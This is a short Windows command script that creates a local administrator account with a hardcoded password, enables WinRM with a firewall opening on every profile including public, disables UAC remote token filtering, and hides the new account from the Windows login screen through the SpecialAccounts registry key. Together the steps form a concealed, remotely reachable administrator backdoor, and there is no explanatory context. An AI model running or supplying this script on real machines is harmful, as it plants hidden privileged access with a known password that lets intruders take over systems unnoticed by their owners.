$Username = "RD_User"
$Password = "RD_P@ssW0rD"

net user $Username $Password /add
net localgroup Administrators $Username /add
winrm quickconfig -quiet
netsh advfirewall firewall add rule name="Windows Remote Management for RD" protocol=TCP localport=5985 dir=in action=allow profile=public,private,domain
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v $Username /t REG_DWORD /d 0

exit
